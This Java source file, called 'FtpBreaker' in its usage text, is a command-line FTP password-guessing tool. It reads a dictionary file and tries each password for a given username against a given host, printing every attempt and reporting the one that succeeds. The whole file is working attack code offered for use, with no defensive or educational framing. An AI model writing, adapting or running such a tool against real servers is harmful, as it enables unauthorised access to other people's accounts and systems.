import org.apache.commons.cli.*;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

public class Main {
    public static void main(String args[]) {

        CommandLine commandLine;
        try {
            commandLine = new GnuParser().parse(createOptionsForCommandLine(), args);
        } catch (MissingOptionException e) {
            showUsage();
            return;
        } catch (ParseException e) {
            e.printStackTrace();
            return;
        }

        try {
            BufferedReader reader = new BufferedReader(new FileReader(commandLine.getOptionValue("d")));
            FTPClient con = new FTPClient();
            con.connect(commandLine.getOptionValue("h"));
            String userName = commandLine.getOptionValue("u");
            con.user(userName);
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(String.format("Log in... Login:%s Password: %s", userName, line));
                if (FTPReply.isPositiveCompletion(con.pass(line))) {
                    con.disconnect();
                    System.out.println(String.format("You did it! Login: %s Password: %s", userName, line));
                    return;
                }
            }
        } catch (FileNotFoundException e) {
            System.out.println("Dictionary file not found");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void showUsage() {
        System.out.println("Usage: FtpBreaker -h host -u username -d dictionary");
    }

    public static Options createOptionsForCommandLine() {
        Option option_h = OptionBuilder.isRequired().withDescription("The host address").hasArgs(1).create("h");
        Option option_u = OptionBuilder.isRequired().withDescription("The username to login").hasArgs(1).create("u");
        Option option_d = OptionBuilder.isRequired().withDescription("Passwords dictionary").hasArgs(1).create("d");
        Options options = new Options();
        options.addOption(option_h);
        options.addOption(option_u);
        options.addOption(option_d);
        return options;
    }
}
